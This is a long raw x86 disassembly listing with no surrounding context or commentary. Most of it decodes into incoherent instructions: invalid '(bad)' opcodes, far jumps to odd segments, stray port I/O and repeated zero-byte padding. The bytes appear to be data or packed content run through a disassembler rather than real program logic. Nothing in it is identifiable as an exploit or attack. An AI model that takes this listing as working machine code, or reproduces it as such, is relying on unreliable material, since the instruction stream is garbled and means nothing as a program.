  441091:	add    BYTE PTR [eax],al
  441093:	add    BYTE PTR [eax],al
  441095:	add    BYTE PTR [ebx-0x20d478e7],bh
  44109b:	sbb    ecx,ebp
  44109d:	das    
  44109e:	xchg   edi,eax
  44109f:	push   ds
  4410a0:	mov    esi,0x551e692f
  4410a5:	xor    BYTE PTR [ecx],ah
  4410a7:	pop    ds
  4410a8:	xor    BYTE PTR [eax],dh
  4410aa:	mov    edi,0x2630e21e
  4410af:	pop    ds
  4410b0:	aam    0x30
  4410b2:	clc    
  4410b3:	pop    ds
  4410b4:	mov    DWORD PTR [ecx],esi
  4410b6:	fwait
  4410b7:	pop    ds
  4410b8:	add    DWORD PTR [esi],ebp
  4410ba:	cmp    bl,BYTE PTR [esp+edx*4]
  4410bd:	sub    eax,0x2f601c49
  4410c2:	or     BYTE PTR [esi],bl
  4410c4:	test   DWORD PTR [edi],ebp
  4410c6:	rcr    BYTE PTR ds:0x1dc42f57,cl
  4410cc:	pop    ecx
  4410cd:	das    
  4410ce:	mov    dh,0x1d
  4410d0:	cmp    ch,BYTE PTR [edi]
  4410d2:	jle    0x4410f1
  4410d4:	out    0x73,eax
  4410d6:	jnp    0x441135
  4410d8:	mov    ds:0xe9027503,al
  4410dd:	xor    ecx,DWORD PTR [edi-0x5932ffee]
  4410e3:	ret    0x952f
  4410e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4410e7:	mov    ebp,0xa686732f
  4410ec:	das    
  4410ed:	test   DWORD PTR [ecx+eiz*1+0x1b87042e],0xcc87222e
  4410f8:	sub    eax,0x57
  4410fd:	add    BYTE PTR [eax],al
  4410ff:	data16 cmp al,0x2c
  441102:	stos   BYTE PTR es:[edi],al
  441103:	bound  ecx,QWORD PTR [edx+0x33]
  441106:	mov    bh,0x6a
  441108:	pop    edi
  441109:	xor    ebx,DWORD PTR [ebx+eiz*2]
  44110c:	xor    DWORD PTR [ecx],0x31464866
  441112:	add    DWORD PTR [ebx-0x69],0x30
  441116:	mov    al,ds:0x2a36654b
  44111b:	dec    edi
  44111c:	mov    ebx,0x4f9c7435
  441121:	xor    eax,0x3bfb9f66
  441126:	mov    bh,0x92
  441128:	sub    edi,DWORD PTR [ebx]
  44112a:	push   ebx
  44112b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44112c:	inc    esp
  44112d:	cmp    ah,BYTE PTR [edi]
  44112f:	mov    ds:0x98973976,eax
  441134:	pop    ebx
  441135:	cmp    cl,ch
  441137:	jbe    0x441195
  441139:	clc    
  44113a:	test   DWORD PTR [esi+0x2],esi
  44113d:	add    BYTE PTR [edi+0x66],dh
  441140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441141:	das    
  441142:	nop
  441143:	data16 adc BYTE PTR [edi],ch
  441146:	pop    ss
  441147:	imul   edi,esp,0xc867f62c
  44114d:	sub    al,0x93
  44114f:	inc    edi
  441150:	jbe    0x44117e
  441152:	pop    ebp
  441153:	inc    edi
  441154:	ins    DWORD PTR es:[edi],dx
  441155:	sub    al,0x13
  441157:	inc    edi
  441158:	add    esi,DWORD PTR [edi+ebx*8]
  44115b:	inc    edx
  44115c:	div    DWORD PTR [ebx]
  44115e:	add    BYTE PTR [eax],bh
  441160:	adc    al,0x3f
  441162:	xor    al,0x0
  441164:	add    BYTE PTR [eax],al
  441166:	add    BYTE PTR [eax],al
  441168:	loope  0x44117d
  44116a:	xchg   edx,eax
  44116b:	xor    al,0xba
  44116d:	adc    ebp,DWORD PTR [ebp-0x39ec73cc]
  441173:	xor    al,0x2c
  441175:	sbb    eax,DWORD PTR [ecx]
  441177:	xor    eax,0x355e1395
  44117c:	into   
  44117d:	adc    esi,DWORD PTR [ebx+0x40163c35]
  441183:	ss push edi
  441185:	adc    al,0x7a
  441187:	ss ret 
  441189:	adc    al,0xa2
  44118b:	and    BYTE PTR ss:[edi],dl
  44118e:	xor    dh,BYTE PTR [edi]
  441190:	push   esi
  441191:	adc    eax,0x1582374b
  441196:	ins    BYTE PTR es:[edi],dx
  441197:	aaa    
  441198:	mov    dl,0x15
  44119a:	mov    bl,0x37
  44119c:	les    edx,FWORD PTR ds:0x2e56382c
  4411a2:	xchg   ebx,eax
  4411a3:	cmp    BYTE PTR [eax+0x2e],al
  4411a6:	mov    edx,0x272f0638
  4411ab:	cmp    DWORD PTR [edi-0x5dc66dd9],edx
  4411b1:	daa    
  4411b2:	sbb    DWORD PTR [edx],edi
  4411b4:	adc    al,0x29
  4411b6:	mov    ch,0x3a
  4411b8:	sub    ch,BYTE PTR [eax]
  4411ba:	pop    es
  4411bb:	cmp    ebx,DWORD PTR [ebp+0x29]
  4411be:	arpl   WORD PTR [ebx],di
  4411c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4411c1:	sub    dh,BYTE PTR [ebx+edi*1+0x3c6c2938]
  4411c8:	push   ss
  4411c9:	adc    dh,BYTE PTR [ebx+0x3c]
  4411cf:	add    BYTE PTR [eax],al
  4411d1:	xor    ch,BYTE PTR [ebx]
  4411d3:	sub    edi,DWORD PTR [esi]
  4411d5:	sub    DWORD PTR [ebx+esi*8],0x1f2d783e
  4411dc:	aas    
  4411dd:	fsubr  DWORD PTR [esi]
  4411df:	jb     0x441220
  4411e1:	jne    0x4411d1
  4411e3:	sub    al,BYTE PTR [eax]
  4411e5:	jne    0x441250
  4411e7:	or     al,0xfe
  4411e9:	jb     0x441268
  4411eb:	cld    
  4411ec:	push   DWORD PTR [ebp-0x38]
  4411ef:	xor    eax,DWORD PTR [eax]
  4411f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4411f2:	sub    DWORD PTR ds:0x2e49a4d9,ebp
  4411f8:	cs xchg edi,eax
  4411fb:	sub    eax,0x2efe87ac
  441200:	fild   WORD PTR [esi-0x7e45cf27]
  441206:	test   al,0x30
  441208:	aas    
  441209:	push   0x605c312b
  44120e:	xor    DWORD PTR [ecx],0xffffff97
  441211:	imul   ebp,DWORD PTR [esi+0x25],0x18
  441215:	pop    esp
  441216:	repz and eax,0x276e4fc3
  44121c:	inc    ebp
  44121d:	dec    esi
  44121e:	mov    dl,0x27
  441220:	lods   eax,DWORD PTR ds:[esi]
  441221:	ds test eax,0x943ecc27
  441227:	daa    
  441228:	in     eax,0xae
  44122a:	adc    al,0x30
  44122c:	test   BYTE PTR [ecx-0x5e5ed746],ch
  441232:	bound  ebp,QWORD PTR [edx]
  441234:	adc    al,BYTE PTR [eax]
  441236:	add    BYTE PTR [eax],al
  441238:	add    BYTE PTR [eax],al
  44123a:	fwait
  44123b:	push   cs
  44123c:	sub    ah,BYTE PTR [esi]
  44123e:	xchg   edx,eax
  44123f:	imul   ebx,DWORD PTR [esi+edi*8],0xfffcecca
  441246:	jne    0x441299
  441248:	sub    al,0x99
  44124a:	test   DWORD PTR [ebx-0x2b9b31d3],edi
  441250:	cs pop esi
  441252:	in     ax,0x2f
  441255:	sub    al,0x69
  441257:	aas    
  441258:	xor    dl,cl
  44125a:	popa   
  44125b:	cmp    dh,BYTE PTR [ecx]
  44125d:	push   ds
  44125e:	dec    eax
  44125f:	add    cl,bh
  441261:	ss out dx,eax
  441263:	adc    al,0x44
  441265:	ss retf 0x5214
  441269:	ss jo  0x441280
  44126c:	sub    BYTE PTR ds:0x2b701157,dh
  441272:	push   eax
  441273:	sbb    esp,DWORD PTR [ebx-0x7de43fd6]
  441279:	sub    dl,BYTE PTR [esp+ebx*1]
  44127c:	cmp    ebp,DWORD PTR [edx]
  44127e:	push   es
  44127f:	sbb    al,0xeb
  441281:	sub    eax,0x2dfb1c79
  441286:	xchg   esp,eax
  441287:	sbb    al,0x7e
  441289:	cs dec esp
  44128b:	sbb    eax,0x1e492ee2
  441290:	scas   al,BYTE PTR es:[edi]
  441291:	sub    BYTE PTR [ecx+0x17],cl
  441294:	outs   dx,DWORD PTR ds:[esi]
  441295:	sub    DWORD PTR [edx],ecx
  441297:	sbb    BYTE PTR [esi-0x5ee822d7],al
  44129d:	sub    DWORD PTR [eax],eax
  44129f:	add    BYTE PTR [eax],al
  4412a1:	add    BYTE PTR [eax],al
  4412a3:	jbe    0x4412bd
  4412a5:	clc    
  4412a6:	sub    DWORD PTR [eax+0x18],esp
  4412a9:	into   
  4412aa:	sub    DWORD PTR [edi+0x18],eax
  4412ad:	cmp    BYTE PTR [edx],ch
  4412af:	js     0x4412c9
  4412b1:	ins    DWORD PTR es:[edi],dx
  4412b2:	sub    dh,BYTE PTR [ecx]
  4412b4:	sbb    DWORD PTR [ebp-0x14e71dd6],edx
  4412ba:	sub    cl,BYTE PTR [edi+0x2d2b2519]
  4412c0:	sbb    edi,edi
  4412c2:	sub    bh,cl
  4412c4:	sbb    DWORD PTR [ebp+0x2b],edi
  4412c7:	jmp    0x4119:0x9c2b3019
  4412ce:	sub    esi,DWORD PTR [ebp+0x2]
  4412d1:	out    0x33,eax
  4412d3:	mov    bl,0x59
  4412d5:	mov    al,BYTE PTR [esi*2-0x79cc15fe]
  4412dc:	adc    al,BYTE PTR [eax]
  4412de:	fwait
  4412df:	mov    sp,0xb42f
  4412e3:	inc    esi
  4412e4:	iret   
  4412e5:	das    
  4412e6:	jge    0x441329
  4412e8:	jns    0x441319
  4412ea:	popa   
  4412eb:	dec    ecx
  4412ec:	pushf  
  4412ed:	das    
  4412ee:	xor    DWORD PTR [ecx+0x6d],eax
  4412f1:	das    
  4412f2:	adc    BYTE PTR [ecx-0x5e20d10e],ch
  4412f8:	sub    al,0x2f
  4412fa:	shr    DWORD PTR [ecx-0x5e63d135],0xed
  441301:	cs jbe 0x44128d
  441304:	mov    WORD PTR [esi],gs
  441306:	jge    0x441308
  441308:	add    BYTE PTR [eax],al
  44130a:	add    BYTE PTR [eax],al
  44130c:	sub    DWORD PTR [ebp+0x4989a32e],0x381be2e
  441316:	imul   BYTE PTR cs:[eax+0x21]
  44131a:	cs pop es
  44131c:	arpl   bp,cx
  44131e:	sub    eax,0x2de06b45
  441323:	arpl   WORD PTR [eax+0x70],sp
  441326:	sub    eax,0x2d964883
  44132b:	mov    ebx,0xe32d5440
  441330:	dec    ebx
  441331:	xchg   BYTE PTR [ecx*2-0x77d358bd],ch
  441338:	stos   DWORD PTR es:[edi],eax
  441339:	imul   ebp,DWORD PTR [eax+ebx*8],0xffffff9a
  44133d:	cli    
  44133e:	xor    ebx,edi
  441340:	xchg   edx,eax
  441341:	push   ds
  441342:	xor    al,0xc5
  441344:	mov    dl,BYTE PTR [esi]
  441346:	xor    al,0x23
  441348:	test   DWORD PTR [eax-0x166533cd],esi
  44134e:	xor    ebp,DWORD PTR [ebx]
  441350:	xchg   edx,eax
  441351:	add    dh,BYTE PTR [ebx]
  441353:	sbb    eax,0xcf331784
  441358:	gs jb  0x44138d
  44135b:	add    BYTE PTR [ecx],ch
  44135d:	adc    cl,ch
  44135f:	xor    eax,0x35f3123b
  441364:	je     0x44137a
  441366:	dec    esi
  441367:	les    edx,FWORD PTR ss:[edx]
  44136a:	mov    bh,0x36
  44136c:	mov    dl,BYTE PTR [ebx]
  44136e:	xor    al,0x37
  441370:	add    BYTE PTR [eax],al
  441372:	add    BYTE PTR [eax],al
  441374:	add    BYTE PTR [edi+0x1d377e13],dh
  44137a:	adc    al,0xb1
  44137c:	aaa    
  44137d:	mov    dl,BYTE PTR [eax+eax*1]
  441380:	add    BYTE PTR [esp+eax*2-0x6],bl
  441384:	push   DWORD PTR [eax]
  441386:	add    al,0x0
  441388:	add    BYTE PTR [esi+0x1537c812],dl
  44138e:	daa    
  44138f:	dec    ebx
  441390:	cmp    ebp,eax
  441392:	sub    edx,DWORD PTR [edi-0x2cd71cc6]
  441398:	cmp    ch,BYTE PTR [eax]
  44139a:	sub    DWORD PTR [ecx],ecx
  44139c:	cmp    ebx,DWORD PTR [edi+0x83bae25]
  4413a2:	sub    ebp,DWORD PTR [edx+0x3d]
  4413a5:	or     esp,DWORD PTR [eax]
  4413a7:	jmp    0x4413e6
  4413a9:	xchg   esi,eax
  4413aa:	sub    al,0xa3
  4413ac:	aas    
  4413ad:	sbb    al,0x34
  4413af:	cli    
  4413b0:	push   DWORD PTR [eax-0x4f000002]
  4413b6:	adc    BYTE PTR [edx-0xf291ce],ch
  4413bc:	xor    edi,DWORD PTR [eax+0x3034ae27]
  4413c2:	adc    al,BYTE PTR [esi*1+0x355428ad]
  4413c9:	or     ch,BYTE PTR [eax]
  4413cb:	int    0x35
  4413cd:	add    BYTE PTR [eax],ch
  4413cf:	sbb    DWORD PTR [esi],esi
  4413d1:	imul   edx,DWORD PTR [edi*1+0x3312ca36],0x37
  4413d9:	add    BYTE PTR [eax],al
  4413db:	add    BYTE PTR [eax],al
  4413dd:	add    BYTE PTR [ebp+0x75],dh
  4413e0:	cs mov edx,0xdc2ef66a
  4413e6:	bound  esi,QWORD PTR [edx+0x2c5d1d2e]
  4413ec:	sub    al,0xcc
  4413ee:	pop    ebp
  4413ef:	ret    0xf2b
  4413f2:	dec    esp
  4413f3:	xor    al,0x25
  4413f5:	inc    ebx
  4413f6:	dec    esp
  4413f7:	cdq    
  4413f8:	and    eax,0x257c3c5a
  4413fd:	mov    esp,0x1525223c
  441402:	scas   eax,DWORD PTR es:[edi]
  441403:	inc    esp
  441404:	sub    ah,BYTE PTR [edi-0x51]
  441407:	xchg   esp,eax
  441408:	sub    esi,DWORD PTR [ecx+eiz*4+0x1f]
  44140c:	sub    BYTE PTR [edx-0x2239666],dh
  441412:	push   edx
  441413:	and    DWORD PTR [eax+eax*1],eax
  441416:	jne    0x44145e
  441418:	sub    eax,0x326084f6
  44141d:	mov    esp,0x6324387
  441422:	pop    cx
  441424:	xor    ebp,DWORD PTR [edx]
  441426:	push   di
  441428:	xor    edi,DWORD PTR [ebx]
  44142a:	and    si,WORD PTR [ebx]
  44142d:	pop    edi
  44142e:	retw   
  441430:	xor    bh,BYTE PTR [eax+0x46]
  441433:	sub    BYTE PTR [ebx],dh
  441435:	add    DWORD PTR [esi+0x7f],0x9146ad33
  44143c:	xor    edx,eax
  44143e:	inc    esi
  44143f:	xchg   esi,eax
  441440:	xor    esp,edi
  441442:	add    BYTE PTR [eax],al
  441444:	add    BYTE PTR [eax],al
  441446:	add    BYTE PTR [esi-0x590dcc87],ah
  44144c:	xor    BYTE PTR [ebx],0x3
  44144f:	test   eax,0xa13c288f
  441454:	daa    
  441455:	xor    BYTE PTR [eax-0x77],dl
  441458:	or     al,0x30
  44145a:	add    DWORD PTR [bp+si],0xe3d2fd7
  441461:	addr16 das 
  441463:	hlt    
  441464:	or     eax,0xe132f77
  441469:	sub    DWORD PTR [edi],0x2f7c0dd9
  44146f:	pusha  
  441470:	or     eax,0xd282ead
  441475:	lea    ebp,[esi]
  441477:	dec    DWORD PTR [esp+edx*2]
  44147a:	cs out dx,eax
  44147c:	or     al,0x4c
  44147e:	cs pop eax
  441480:	adc    dh,ah
  441482:	xor    BYTE PTR [edi+0xf],bl
  441485:	lods   eax,DWORD PTR ds:[esi]
  441486:	xor    dh,bl
  441488:	or     eax,0xe2e306e
  44148d:	and    al,0x30
  44148f:	fwait
  441490:	sbb    dh,BYTE PTR [ebx+ebp*1+0x2b021afa]
  441497:	xchg   esi,eax
  441498:	sbb    edi,DWORD PTR [edx]
  44149a:	sub    al,BYTE PTR [esi]
  44149c:	sbb    al,0xad
  44149e:	sub    eax,0x29e31c3f
  4414a3:	pop    esp
  4414a4:	sbb    BYTE PTR [edx],bh
  4414a6:	sub    ch,BYTE PTR [eax+0x2a5f18]
  4414ac:	add    BYTE PTR [eax],al
  4414ae:	add    BYTE PTR [eax],al
  4414b0:	cmp    bl,BYTE PTR [ecx]
  4414b2:	mov    esp,0xf219572a
  4414b7:	sub    ch,BYTE PTR [ecx+ebx*1+0x19e52b30]
  4414be:	jp     0x4414eb
  4414c0:	sbb    eax,0xdd286c1a
  4414c5:	push   ss
  4414c6:	pop    ebx
  4414c7:	sub    BYTE PTR [ebx+0x17],al
  4414ca:	xor    DWORD PTR [ecx],ebp
  4414cc:	std    
  4414cd:	pop    ss
  4414ce:	push   esp
  4414cf:	sub    DWORD PTR [eax],esp
  4414d1:	sbb    BYTE PTR [ebp-0x69e84bd7],ah
  4414d7:	sub    DWORD PTR [eax],esi
  4414d9:	adc    al,0x0
  4414db:	sbb    BYTE PTR [ebx-0x6c61c6bf],bl
  4414e1:	add    al,BYTE PTR [eax]
  4414e3:	jmp    0xe23c6cae
  4414e8:	jbe    0x4414ec
  4414ea:	add    BYTE PTR [esi+0x68],ch
  4414ed:	adc    DWORD PTR [esi],ebp
  4414ef:	gs addr16 push ebp
  4414f2:	sub    eax,0x339252b3
  4414f7:	and    al,0x65
  4414f9:	push   esp
  4414fa:	xor    esp,ebp
  4414fc:	inc    ebp
  4414fd:	lahf   
  4414fe:	xor    ah,BYTE PTR [edx+0x4831d558]
  441504:	push   ebx
  441505:	nop
  441506:	xor    DWORD PTR ds:0x2312f4b,ebp
  44150c:	mov    ds:0x9b103164,eax
  441511:	pop    ebx
  441512:	xor    ecx,ebx
  441514:	add    BYTE PTR [eax],al
  441516:	add    BYTE PTR [eax],al
  441518:	add    BYTE PTR [ebx-0x7420cf10],dl
  44151e:	mov    ah,0x30
  441520:	pop    esi
  441521:	mov    ds:0x9ede3047,al
  441526:	fnsave [edi]
  441528:	aam    0x8e
  44152a:	pop    eax
  44152b:	aaa    
  44152c:	sbb    eax,0xcb36da88
  441531:	popa   
  441532:	pusha  
  441533:	ss mov ebp,0xc4365259
  441539:	push   ecx
  44153a:	push   edi
  44153b:	fisttp DWORD PTR ss:[ebp+ebp*8+0x35]
  441540:	inc    ebx
  441541:	pop    edi
  441542:	dec    eax
  441543:	xor    eax,0x35035cc6
  441548:	in     al,0x4f
  44154a:	outs   dx,DWORD PTR ds:[esi]
  44154b:	cmp    ecx,DWORD PTR [eax+0x243b5b52]
  441551:	pushf  
  441552:	mov    bh,0x3a
  441554:	mov    cl,0x9d
  441556:	mov    bl,0x38
  441558:	add    BYTE PTR [ebp+ebx*1+0x1c353f9c],al
  44155f:	mov    edx,0xfa80dc3f
  441564:	inc    DWORD PTR [ecx+eax*1+0x10cb0000]
  44156b:	xor    BYTE PTR es:[esi],cl
  44156e:	adc    DWORD PTR [eax-0x5feedcd0],eax
  441574:	xor    ch,dh
  441576:	adc    BYTE PTR [edi+0xf115230],dh
  44157c:	xor    DWORD PTR [eax],eax
  44157e:	add    BYTE PTR [eax],al
  441580:	add    BYTE PTR [eax],al
  441582:	mov    ecx,0x8631340d
  441587:	or     eax,0xde93148
  44158c:	push   ecx
  44158d:	xor    esp,esp
  44158f:	or     eax,0xe21316f
  441594:	leave  
  441595:	xor    DWORD PTR [edi],esp
  441597:	adc    bl,BYTE PTR [edi+0x32]
  44159a:	or     eax,0xe9327512
  44159f:	adc    DWORD PTR [edx-0x63ee3cce],ecx
  4415a5:	xor    bh,BYTE PTR [ebp-0x48cd61ef]
  4415ab:	adc    DWORD PTR [eax-0x4aef1ece],esi
  4415b1:	xor    dl,BYTE PTR [ebx+0x13]
  4415b4:	jne    0x4415e9
  4415b6:	sahf   
  4415b7:	adc    DWORD PTR [edi+0x33],edi
  4415ba:	retf   0x2a11
  4415bd:	xor    al,0xb2
  4415bf:	adc    ch,BYTE PTR [edx+0x34]
  4415c2:	in     eax,dx
  4415c3:	adc    bl,BYTE PTR [esi-0x17ed1fcc]
  4415c9:	xor    al,0x20
  4415cb:	and    eax,0x262b3618
  4415d0:	push   eax
  4415d1:	ss jae 0x4415f8
  4415d4:	div    DWORD PTR [esi]
  4415d6:	jne    0x441582
  4415d8:	sub    cl,BYTE PTR [ebx-0x53]
  4415db:	sti    
  4415dc:	sub    edi,DWORD PTR [esi-0x61]
  4415df:	shl    BYTE PTR ds:0x25859f8d,cl
  4415e5:	push   ss
  4415e6:	add    BYTE PTR [eax],al
  4415e8:	add    BYTE PTR [eax],al
  4415ea:	add    BYTE PTR [esi-0x71d9d8b8],cl
  4415f0:	cdq    
  4415f1:	daa    
  4415f2:	ds jle 0x441587
  4415f5:	daa    
  4415f6:	dec    edi
  4415f7:	jle    0x441584
  4415f9:	daa    
  4415fa:	pop    ebx
  4415fb:	outs   dx,BYTE PTR ds:[esi]
  4415fc:	dec    eax
  4415fd:	daa    
  4415fe:	outs   dx,BYTE PTR ds:[esi]
  4415ff:	outs   dx,BYTE PTR ds:[esi]
  441600:	frstor [esi]
  441602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441603:	pop    esi
  441604:	aad    0x26
  441606:	mov    ch,0x5e
  441608:	sub    ah,BYTE PTR [edi]
  44160a:	int    0x4e
  44160c:	out    dx,eax
  44160d:	fimul  WORD PTR es:[esi-0x4]
  441611:	daa    
  441612:	inc    edx
  441613:	inc    ecx
  441614:	popf   
  441615:	and    BYTE PTR [ecx+0x4427f839],al
  44161b:	mov    al,0xb9
  44161d:	and    BYTE PTR [ecx-0x69dc7158],bh
  441623:	mov    ds:0x5afd8c69,al
  441628:	popf   
  441629:	cld    
  44162a:	push   DWORD PTR [ebp+0x67]
  44162d:	sub    eax,0x28a18473
  441632:	jb     0x4415bd
  441634:	sub    DWORD PTR [eax],0xfffffff1
  441637:	adc    DWORD PTR [edi+0x29],0x29e76870
  44163e:	push   esp
  44163f:	bound  esi,QWORD PTR [ebp+0x245d062b]
  441645:	sub    al,0x8c
  441647:	pop    ebp
  441648:	cld    
  441649:	and    al,0x3f
  44164b:	dec    esp
  44164c:	fbld   TBYTE PTR ds:0x90
  441652:	add    BYTE PTR [eax],al
  441654:	dec    esp
  441655:	xor    eax,0x23f4c26
  44165a:	out    dx,eax
  44165b:	sub    dl,bl
  44165d:	push   ss
  44165e:	out    dx,eax
  44165f:	daa    
  441660:	push   edx
  441661:	push   ss
  441662:	mov    ch,0x27
  441664:	lea    edx,ds:0x14ca266f
  44166a:	add    eax,0xe7134a25
  44166f:	mov    ds:0x39252d0,eax
  441674:	jne    0x441678
  441676:	jmp    0x4e33:0x3f11fd33
  44167d:	adc    BYTE PTR [edi+0x31],bh
  441680:	push   esi
  441681:	unpckhps xmm6,XMMWORD PTR [ecx]
  441684:	dec    ebp
  441685:	btr    DWORD PTR [eax],0x27
  441689:	cmovns esi,DWORD PTR [eax]
  44168c:	push   0xe
  44168e:	mov    eax,0x9d0d672f
  441693:	or     DWORD PTR cs:0xc6a2e4a,ecx
  44169a:	imul   ebp,DWORD PTR ds:0x2d600bc6,0x2e
  4416a1:	sbb    DWORD PTR [eax],ebp
  4416a3:	sub    eax,0x2d201936
  4416a8:	sbb    DWORD PTR cs:[eax],ebx
  4416ab:	sub    eax,0x2d201946
  4416b0:	sbb    DWORD PTR cs:[eax],ecx
  4416b3:	sub    eax,0x2d001956
  4416b8:	add    BYTE PTR [eax],al
  4416ba:	add    BYTE PTR [eax],al
  4416bc:	add    BYTE PTR [esi+0x19],cl
  4416bf:	fcomp  DWORD PTR [edx]
  4416c1:	push   0x19
  4416c3:	adc    ebx,DWORD PTR [ebx]
  4416c5:	retf   0x4519
  4416c8:	sbb    edx,DWORD PTR [edx-0x5de4c5e7]
  4416ce:	sbb    DWORD PTR [edi+0x1b],ebp
  4416d1:	add    eax,0xc81b8b1a
  4416d6:	sbb    DWORD PTR [eax],eax
  4416d8:	loop   0x441748
  4416da:	lock aaa 
  4416dc:	pop    ds
  4416dd:	popa   
  4416de:	imul   esi,DWORD PTR [edi],0xffffffed
  4416e1:	pop    ecx
  4416e2:	add    BYTE PTR [edi],dh
  4416e4:	sub    dl,BYTE PTR [eax-0x77e9c941]
  4416ea:	jl     0x441722
  4416ec:	jae    0x44166e
  4416ee:	mov    ds:0x91783d36,al
  4416f3:	ss jns 0x441766
  4416f6:	push   edi
  4416f7:	ss out dx,al
  4416f9:	push   0x638535fc
  4416fe:	addr16 xor eax,0x35165b5f
  441704:	and    dl,BYTE PTR [edx-0x7425cb55]
  44170a:	fdiv   DWORD PTR [esp+edi*2]
  44170d:	adc    BYTE PTR [ebp+0x17a3234],0x3c
  441714:	mov    dh,0x72
  441716:	ds cmp edx,edi
  441719:	push   ebp
  44171a:	fidivr WORD PTR [edx]
  44171c:	jge    0x441772
  44171e:	mov    eax,ds:0x5e3a
  441723:	add    BYTE PTR [eax],al
  441725:	add    BYTE PTR [edi+edi*1+0x3a],dl
  441729:	push   cs
  44172a:	xchg   esp,eax
  44172b:	sbb    al,0x3a
  44172d:	adc    BYTE PTR [ebx+ebp*2-0x7268c1c7],0x39
  441735:	aaa    
  441736:	xchg   edi,eax
  441737:	xor    al,0x39
  441739:	std    
  44173a:	xchg   esp,eax
  44173b:	(bad)  
  44173c:	cmp    ah,dl
  44173e:	xchg   edi,eax
  44173f:	or     eax,0xe6979b39
  441744:	cmp    BYTE PTR [ebx-0x69],ch
  441747:	mov    DWORD PTR [eax],edi
  441749:	outs   dx,BYTE PTR ds:[esi]
  44174a:	push   edi
  44174b:	jae    0x441785
  44174d:	je     0x4417a6
  44174f:	xchg   esp,eax
  441750:	cmp    BYTE PTR [edi+0x383757],cl
  441756:	or     al,0x75
  441758:	cli    
  441759:	inc    eax
  44175b:	push   es
  44175c:	add    BYTE PTR [eax],al
  44175e:	push   ss
  44175f:	cmc    
  441760:	rdtsc  
  441762:	ja     0x44175b
  441764:	cmp    DWORD PTR [ecx],esi
  441766:	inc    ebp
  441767:	idiv   DWORD PTR [eax+0x31]
  44176a:	cmp    al,0xf6
  44176c:	or     DWORD PTR [edx],esi
  44176e:	enter  0x69f6,0x32
  441772:	dec    edi
  441773:	test   DWORD PTR [eax],0x8ceba535
  441779:	xor    eax,0x363dea20
  44177e:	push   ebp
  44177f:	jmp    0x441790
  441781:	aaa    
  441782:	(bad)  
  441783:	jmp    0x4417ee
  441785:	aaa    
  441786:	out    dx,al
  441787:	jmp    0x44174f
  441789:	aaa    
  44178a:	add    BYTE PTR [eax],al
  44178c:	add    BYTE PTR [eax],al
  44178e:	add    BYTE PTR [eax+0x5e3831ec],ah
  441794:	in     eax,dx
  441795:	leave  
  441796:	cmp    BYTE PTR [ebp+0x2c3992ed],ah
  44179c:	out    dx,al
  44179d:	cld    
  44179e:	cmp    DWORD PTR [ebp-0x10],esp
  4417a1:	inc    ebx
  4417a2:	cmp    al,bl
  4417a4:	out    dx,al
  4417a5:	fwait
  4417a6:	cmp    dh,dh
  4417a8:	out    dx,al
  4417a9:	aam    0x3a
  4417ab:	jnp    0x44179c
  4417ad:	pop    eax
  4417ae:	cmp    ebx,DWORD PTR [edx]
  4417b0:	lock push cs
  4417b2:	cmp    eax,0x3de1229e
  4417b7:	sub    DWORD PTR [edx],esp
  4417b9:	jae    0x4417f9
  4417bb:	jge    0x4417de
  4417bd:	jmp    0x873f:0x8e253a3e
  4417c4:	and    al,0xf1
  4417c6:	aas    
  4417c7:	dec    esp
  4417c8:	(bad)  
  4417c9:	cli    
  4417ca:	push   DWORD PTR [esi+eax*1-0x94b0000]
  4417d1:	xor    DWORD PTR [eax],0x75
  4417d4:	int3   
  4417d5:	adc    esi,ecx
  4417d7:	gs ret 0xa30c
  4417db:	fs push ds
  4417dd:	adc    bl,BYTE PTR [ebx]
  4417df:	inc    esi
  4417e0:	(bad)  
  4417e1:	adc    al,BYTE PTR [esi+eax*2+0x49b7177d]
  4417e8:	jbe    0x441801
  4417ea:	out    dx,eax
  4417eb:	inc    ecx
  4417ec:	push   edx
  4417ed:	adc    DWORD PTR [ebx],ecx
  4417ef:	test   al,0x4a
  4417f1:	adc    DWORD PTR [ebx],edx
  4417f3:	add    BYTE PTR [eax],al
  4417f5:	add    BYTE PTR [eax],al
  4417f7:	add    BYTE PTR [eax-0x57e4eeae],ah
  4417fd:	cmp    dl,BYTE PTR [ecx]
  4417ff:	and    esp,DWORD PTR [eax-0x77d4eece]
  441805:	mov    dl,BYTE PTR [ecx]
  441807:	xor    eax,DWORD PTR [eax-0x77c4ee6e]
  44180d:	sbb    dl,BYTE PTR [ecx]
  44180f:	inc    ebx
  441810:	xor    ch,0x15
  441813:	aaa    
  441814:	outs   dx,BYTE PTR ds:[esi]
  441815:	test   al,0x1e
  441817:	lods   al,BYTE PTR ds:[esi]
  441818:	imul   esp,DWORD PTR [edx],0x1e
  44181b:	pop    ds
  44181c:	bound  ecx,QWORD PTR [edx-0x1ea58fe1]
  441822:	push   ds
  441823:	rcl    BYTE PTR [edx+0x59],0x2c
  441827:	std    
  441828:	mov    bh,cl
  44182a:	cld    
  44182b:	push   DWORD PTR [ebp+0x30]
  44182e:	adc    ah,BYTE PTR [eax+0x47]
  441831:	leave  
  441832:	adc    eax,ebp
  441834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441835:	add    ebx,DWORD PTR [eax]
  441837:	or     esp,DWORD PTR [edx-0x55ece8b6]
  44183d:	push   edx
  44183e:	pop    ss
  44183f:	sbb    esp,DWORD PTR [edx-0x75dce8c6]
  441845:	xor    dl,BYTE PTR [edi]
  441847:	sub    eax,DWORD PTR [edx-0x75cce876]
  44184d:	xchg   edx,eax
  44184e:	pop    ss
  44184f:	cmp    eax,DWORD PTR [edx-0x49e6d7fe]
  441855:	pop    ss
  441856:	xor    BYTE PTR [ecx],bl
  441858:	mov    esi,0x193817
  44185d:	add    BYTE PTR [eax],al
  44185f:	add    BYTE PTR [eax],al
  441861:	(bad)  
  441862:	pop    ss
  441863:	xor    BYTE PTR [ecx],bl
  441865:	mov    esi,0x96194817
  44186a:	pop    ss
  44186b:	push   eax
  44186c:	sbb    DWORD PTR [esi-0x79e6c7e9],ebx
  441872:	pop    ss
  441873:	xor    BYTE PTR [ecx],bl
  441875:	jle    0x44188e
  441877:	push   0x7016f618
  44187c:	sbb    dh,bh
  44187e:	push   ss
